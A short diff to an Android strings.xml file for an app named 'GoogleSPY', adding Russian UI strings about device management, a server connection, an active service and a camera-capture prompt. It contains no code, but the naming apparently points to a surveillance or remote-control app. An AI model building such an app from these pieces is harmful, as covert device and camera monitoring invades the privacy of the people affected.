@@ -1,3 +1,8 @@
 <resources>
     <string name="app_name">GoogleSPY</string>
+    <string name="notification_channel_name">Управление устройством</string>
+    <string name="notification_title">Подключение к серверу</string>
+    <string name="notification_text">Сервис активен</string>
+    <string name="camera_request_title">Запрос камеры</string>
+    <string name="camera_request_text">Нажмите для съёмки</string>
 </resources>
